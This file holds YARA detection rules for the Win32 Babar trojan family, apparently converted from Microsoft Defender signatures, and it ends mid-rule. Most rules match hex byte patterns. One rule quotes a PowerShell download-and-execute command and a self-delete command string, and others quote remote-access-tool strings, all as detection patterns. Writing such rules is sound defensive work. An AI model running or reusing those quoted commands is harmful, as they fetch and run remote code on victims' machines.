rule Trojan_Win32_Babar_SPQ_2147840773_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.SPQ!MTB"
        threat_id = "2147840773"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "c ping 127.0.0.1 && del" wide //weight: 1
        $x_1_2 = "powershell -command IEX(New-Object Net.Webclient).DownloadString('%s/%s')" wide //weight: 1
        $x_1_3 = "%s/ab%d.exe" wide //weight: 1
        $x_1_4 = "fgkhlterfjhkglremkhrethre" wide //weight: 1
        $x_1_5 = "jkewqjterwgerwgre" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_RC_2147846641_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.RC!MTB"
        threat_id = "2147846641"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "RAT - SERVER" ascii //weight: 1
        $x_1_2 = "Exit RAT chat" ascii //weight: 1
        $x_1_3 = "CESSA2020\\UTILERIAS\\ratbythedaywalker\\project\\server\\server.vbp" ascii //weight: 1
        $x_1_4 = "Desktop Hidden" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_MKV_2147846727_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.MKV!MTB"
        threat_id = "2147846727"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b e9 c1 ed ?? 81 e5 ?? ?? ?? ?? 81 e6 ?? ?? ?? ?? 30 8b ?? ?? ?? ?? 29 3e 6c 24 30 33 a3 ?? ?? ?? ?? da c1 eb ?? 33 74 9d 00 a3 05 1c 8b df 2f 02 5c 00 00 a3 ?? ?? ?? ?? 10 c1 eb ?? 8b e9 89 4c 24}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_SPS_2147847107_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.SPS!MTB"
        threat_id = "2147847107"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b 4d d4 8a 91 ?? ?? ?? ?? 88 55 d3 0f b6 45 d3 03 45 d4 88 45 d3 0f b6 4d d3 f7 d1 88 4d d3 0f b6 55 d3 03 55 d4 88 55 d3}  //weight: 1, accuracy: Low
        $x_1_2 = "oomcebgyjpbwmg" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_GMC_2147891933_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.GMC!MTB"
        threat_id = "2147891933"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "12"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {22 db 1f 89 c4 22 11 91 32 22 20 5b 02 d3 49 dc 8e f5}  //weight: 10, accuracy: High
        $x_1_2 = "@.vmp0" ascii //weight: 1
        $x_1_3 = "xuni00A0uni0E01uni" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_GPA_2147896300_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.GPA!MTB"
        threat_id = "2147896300"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_4_1 = {89 f7 89 f0 31 db 83 c7 5c 81 2e ?? ?? ?? ?? 83 c6 04 66 ba ?? ?? 39 fe 7c ef}  //weight: 4, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_ABR_2147901335_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.ABR!MTB"
        threat_id = "2147901335"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {50 68 00 a0 00 00 8d 85 f4 5f ff ff 50 8b 45 fc 50}  //weight: 1, accuracy: High
        $x_1_2 = {83 c0 40 8d 95 f4 5f ff ff e8 17 c3 ed ff 8b 85 f0 5f ff ff 33 d2 89 50 3c 8b 85 f0 5f ff ff 33 d2 89 50 44 8b 85 f0 5f ff ff 33 d2 89 50 48}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_SG_2147912601_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.SG!MTB"
        threat_id = "2147912601"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_2_1 = {a1 28 4f 42 00 33 c5 50 ff 75 fc c7 45 fc ff ff ff ff 8d 45 f4}  //weight: 2, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_GLY_2147912815_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.GLY!MTB"
        threat_id = "2147912815"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {54 93 41 00 b2 ?? ?? ?? ?? 94 41 00 a1 ?? ?? ?? ?? 94 41 00 c4 94 41 00 14 95 ?? ?? ?? ?? 41 00 19 94 41 00 e3 94 41 00 50 95 41}  //weight: 10, accuracy: Low
        $x_1_2 = "tmpdb.host.lg2030" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_NB_2147917705_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.NB!MTB"
        threat_id = "2147917705"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "The software you just executed is considered (no skidddddddddeddddd) malware" wide //weight: 2
        $x_2_2 = "THE CREATOR (Hugopako) IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS (NOSKID) MALWARE!" wide //weight: 2
        $x_1_3 = "DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE" wide //weight: 1
        $x_1_4 = "STILL EXECUTE IT?" wide //weight: 1
        $x_1_5 = "This malware will harm your computer and makes it unusable" wide //weight: 1
        $x_1_6 = "If you are seeing this message without knowing what you just executed, simply press No and nothing will happen" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_NK_2147917725_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.NK!MTB"
        threat_id = "2147917725"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = {43 00 3a 00 5c 00 4d 00 41 00 54 00 52 00 49 00 58 00 5c 00 74 00 6d 00 70 00 5c 00 [0-32] 2e 00 76 00 62 00 70 00}  //weight: 3, accuracy: Low
        $x_3_2 = {43 3a 5c 4d 41 54 52 49 58 5c 74 6d 70 5c [0-32] 2e 76 62 70}  //weight: 3, accuracy: Low
        $x_3_3 = "770aae78-f26f-4dba-a829-253c83d1b387" ascii //weight: 3
        $x_1_4 = "GetInstallDetailsPayload" ascii //weight: 1
        $x_1_5 = "DllCanUnloadNow" ascii //weight: 1
        $x_1_6 = "DllRegisterServer" ascii //weight: 1
        $x_1_7 = "DllUnregisterServer" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_3_*) and 4 of ($x_1_*))) or
            ((3 of ($x_3_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_Babar_MBXS_2147919375_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.MBXS!MTB"
        threat_id = "2147919375"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b ec 6a ff 68 ?? d9 65 00 68 ?? 6d 65 00 64 a1 00 00 00 00 50 64 89 25 00 00 00 00 83 ec 58 53 56 57 89 65 e8 ff 15 ?? d3 65 00 33 d2 8a d4}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_MBXT_2147920049_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.MBXT!MTB"
        threat_id = "2147920049"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {55 8b ec 6a ff 68 ?? c2 65 00 68 ?? 60 65 00 64 a1 00 00 00 00 50 64 89 25 00 00 00 00 83 ec 58 53 56 57 89 65 e8 ff 15 ?? c2 65 00 33 d2 8a d4}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_MBXT_2147920049_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.MBXT!MTB"
        threat_id = "2147920049"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {55 8b ec 6a ff 68 ?? 27 4c 00 68 ?? c5 4b 00 64 a1 00 00 00 00 50 64 89 25 00 00 00 00 83 ec 58 53 56 57 89 65 e8 ff 15 ?? 22 4c 00 33 d2 8a d4 89 15}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_WJAA_2147920934_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.WJAA!MTB"
        threat_id = "2147920934"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {55 8b ec 6a ff 68 ?? b4 65 00 68 ?? 52 65 00 64 a1 00 00 00 00 50 64 89 25 00 00 00 00 83 ec 58 53 56 57 89 65 e8 ff 15 ?? ?? 65 00 33 d2 8a d4 89 15 ?? 3c a6 00 8b c8 81 e1 ff 00 00 00 89 0d ?? 3c a6 00 c1 e1 08 03 ca 89 0d ?? 3c a6 00 c1 e8 10 a3 ?? 3c a6 00 6a 01}  //weight: 5, accuracy: Low
        $x_5_2 = {55 8b ec 6a ff 68 ?? c4 65 00 68 ?? 63 65 00 64 a1 00 00 00 00 50 64 89 25 00 00 00 00 83 ec 58 53 56 57 89 65 e8 ff 15 ?? ?? 65 00 33 d2 8a d4 89 15 ?? 4d a6 00 8b c8 81 e1 ff 00 00 00 89 0d ?? 4d a6 00 c1 e1 08 03 ca 89 0d ?? 4d a6 00 c1 e8 10 a3 ?? 4d a6 00 6a 01}  //weight: 5, accuracy: Low
        $x_5_3 = {55 8b ec 6a ff 68 ?? d8 65 00 68 ?? 6b 65 00 64 a1 00 00 00 00 50 64 89 25 00 00 00 00 83 ec 58 53 56 57 89 65 e8 ff 15 ?? ?? 65 00 33 d2 8a d4 89 15 ?? 6d a6 00 8b c8 81 e1 ff 00 00 00 89 0d ?? 6d a6 00 c1 e1 08 03 ca 89 0d ?? 6d a6 00 c1 e8 10 a3 ?? 6d a6 00 6a 01}  //weight: 5, accuracy: Low
        $x_5_4 = {55 8b ec 6a ff 68 ?? b4 65 00 68 ?? 52 65 00 64 a1 00 00 00 00 50 64 89 25 00 00 00 00 83 ec 58 53 56 57 89 65 e8 ff 15 ?? ?? 65 00 33 d2 8a d4 89 15 ?? 3d a6 00 8b c8 81 e1 ff 00 00 00 89 0d ?? 3c a6 00 c1 e1 08 03 ca 89 0d ?? 3c a6 00 c1 e8 10 a3 ?? 3c a6 00 6a 01}  //weight: 5, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Trojan_Win32_Babar_MBXV_2147921632_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.MBXV!MTB"
        threat_id = "2147921632"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {55 8b ec 6a ff 68 ?? c2 65 00 68 ?? 5f 65 00 64 a1 00 00 00 00 50 64 89 25 00 00 00 00 83 ec 58 53 56 57 89 65 e8 ff 15 ?? c2 65 00 33 d2 8a d4 89 15}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_MBXW_2147921634_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.MBXW!MTB"
        threat_id = "2147921634"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {55 8b ec 6a ff 68 ?? e2 65 00 68 ?? 7f 65 00 64 a1 00 00 00 00 50 64 89 25 00 00 00 00 83 ec 58 53 56 57 89 65 e8 ff 15 ?? e2 65 00 33 d2 8a d4}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_WYAA_2147921695_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.WYAA!MTB"
        threat_id = "2147921695"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {55 8b ec 6a ff 68 ?? ea 65 00 68 ?? 86 65 00 64 a1 00 00 00 00 50 64 89 25 00 00 00 00 83 ec 58 53 56 57 89 65 e8 ff 15 ?? ?? 65 00 33 d2 8a d4 89 15 ?? 7a a6 00 8b c8 81 e1 ff 00 00 00 89 0d ?? 7a a6 00 c1 e1 08 03 ca 89 0d ?? 7a a6 00 c1 e8 10 a3 ?? 7a a6 00 6a 01}  //weight: 5, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_AMP_2147923552_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.AMP!MTB"
        threat_id = "2147923552"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {32 d1 8b 0d ?? ?? ?? ?? 03 f8 88 15 [0-30] 81 e3 ff 00 00 00 83 e7 04 03 d2 03 cf 8b 3d ?? ?? ?? ?? 83 e7 0c 33 c0 0f af fb 0b d1 [0-30] 33 df 3b d1 89 44 24}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_CCIM_2147923925_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.CCIM!MTB"
        threat_id = "2147923925"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {55 8b ec 83 ec 1c 53 56 57 a0 48 d0 7c 00 32 05 49 d0 7c 00 a2 48 d0 7c 00 33 c9 8a 0d 43 d0 7c 00 c1 f9 03 83 c9 01 89 4d f0 db 45 f0 dc 3d ?? ?? 7d 00 dd 15 ?? ?? 7d 00 dc 05 ?? ?? 7c 00 dd 1d ?? ?? 7d 00 68 ?? ?? 7c 00 e8}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_CCIN_2147923994_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.CCIN!MTB"
        threat_id = "2147923994"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {55 8b ec 83 ec 1c 53 56 57 a0 48 00 7d 00 32 05 49 00 7d 00 a2 48 00 7d 00 33 c9 8a 0d 43 00 7d 00 c1 f9 03 83 c9 01 89 4d f0 db 45 f0 dc 3d ?? ?? 7d 00 dd 15 ?? ?? 7d 00 dc 05 ?? ?? 7d 00 dd 1d ?? ?? 7d 00 68 ?? ?? 7d 00 e8}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_CCIO_2147924387_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.CCIO!MTB"
        threat_id = "2147924387"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {55 8b ec 83 ec 1c 53 56 57 a0 48 10 7d 00 32 05 49 10 7d 00 a2 48 10 7d 00 33 c9 8a 0d 43 10 7d 00 c1 f9 03 83 c9 01 89 4d f0 db 45 f0}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_MBXZ_2147925445_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.MBXZ!MTB"
        threat_id = "2147925445"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {55 8b ec 6a ff 68 ?? ?? 62 00 68 ?? ?? 62 00 64 a1 00 00 00 00 50 64 89 25 00 00 00 00 83 ec 58 53 56 57 89 65 e8 ff 15 ?? e4 62 00 33 d2 8a d4}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_GA_2147927357_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.GA!MTB"
        threat_id = "2147927357"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {8b 55 ec 8b 45 10 01 c2 8d 4d d8 8b 45 ec 01 c8 0f b6 00 88 02 83 45 ec 01 83 7d ec 0f 7e e1}  //weight: 1, accuracy: High
        $x_1_2 = {01 d0 31 cb 89 da 88 10 83 45 f4 01 0f b6 45 eb 83 c0 01 88 45 eb 80 7d eb 03 76 c7}  //weight: 1, accuracy: High
        $x_1_3 = "get_hostfxr_path" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_MBWJ_2147929212_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.MBWJ!MTB"
        threat_id = "2147929212"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {55 8b ec 6a ff 68 ?? e7 65 00 68 ?? 86 65 00 64 a1 00 00 00 00 50 64 89 25 00 00 00 00 83 ec 58 53 56 57 89 65 e8 ff 15 ?? e2 65 00 33 d2 8a d4}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_CCJT_2147929895_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.CCJT!MTB"
        threat_id = "2147929895"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {01 d0 0f b6 18 0f b6 85 ?? ?? ff ff 0f b6 8c 05 ?? ?? ff ff 8b 95 ?? ?? ff ff 8b 45 ?? 01 d0 31 cb 89 da 88 10}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_OKV_2147929987_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.OKV!MTB"
        threat_id = "2147929987"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {0f b6 db 03 fb 81 e7 ff 00 00 80 79 ?? 4f 81 cf 00 ff ff ff 47 0f b6 5c 37 02 8b 7d e8 30 1c 07 8a 1c 07 a8 0f 75}  //weight: 5, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_CCJU_2147930878_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.CCJU!MTB"
        threat_id = "2147930878"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {01 c8 0f b6 00 0f b6 c0 01 d0 99 f7 bd ?? ?? ?? ?? 89 d0 88 85 ?? ?? ?? ?? 8b 95 ?? ?? ?? ?? 8b 85 ?? ?? ?? ?? 01 d0 0f b6 18 0f b6 85 ?? ?? ?? ?? 0f b6 8c 05 ?? ?? ?? ?? 8b 95 ?? ?? ?? ?? 8b 85 ?? ?? ?? ?? 01 d0 31 cb 89 da 88 10 83 85 ?? ?? ?? ?? ?? 8b 85 ?? ?? ?? ?? 3b 85 ?? ?? ?? ?? 0f 8f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_AKJA_2147931381_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.AKJA!MTB"
        threat_id = "2147931381"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {55 8b ec 6a ff 68 ?? e8 89 00 68 ?? 82 89 00 64 a1 00 00 00 00 50 64 89 25 00 00 00 00 83 ec 58 53 56 57 89 65 e8 ff 15 ?? ?? 89 00 33 d2 8a d4 89 15 ?? 9d c9 00 8b c8 81 e1 ff 00 00 00 89 0d ?? 9d c9 00 c1 e1 08 03 ca 89 0d ?? 9d c9 00 c1 e8 10 a3 ?? 9d c9 00 6a 01}  //weight: 5, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_AYA_2147932498_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.AYA!MTB"
        threat_id = "2147932498"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {0f b7 04 7b 33 d2 6a ?? 59 f7 f1 66 8b 4c 55 ?? 66 89 0c 7b 47 83 ff 08 72}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_YAA_2147933570_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.YAA!MTB"
        threat_id = "2147933570"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "18"
        strings_accuracy = "High"
    strings:
        $x_18_1 = {99 f7 7d d4 89 d0 89 c2 8b 45 10 01 d0 0f b6 00 31 c1 89 ca 8b 45 f4 88 10}  //weight: 18, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_GVA_2147935000_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.GVA!MTB"
        threat_id = "2147935000"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b cb 2b ce 8b d7 8d 9b ?? ?? ?? ?? 8a 1c 01 80 f3 88 88 18 40 4a 75}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_ABB_2147936478_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.ABB!MTB"
        threat_id = "2147936478"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {8b 45 e8 8b 45 c4 8b 55 f8 03 55 e8 8b 45 f4 89 02 8b 4d f8 03 4d c4 89 4d bc 8b 15 04 80 41 00 89 55 cc 8b 45 f8 03 45 e8 8b 4d 08 89 48 04 8b 55 f8 03 55 e8 89 55 ec 8b 45 ac 50}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_A_2147939497_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.A!MTB"
        threat_id = "2147939497"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {5d b3 32 a5 35 5c af 0a af eb 1a ce 3d ca 22 bf 2f 4a b9 71 eb 71 e1 80 73 d8 21 b8 2e 49 b8 07}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_AB_2147939500_0
{
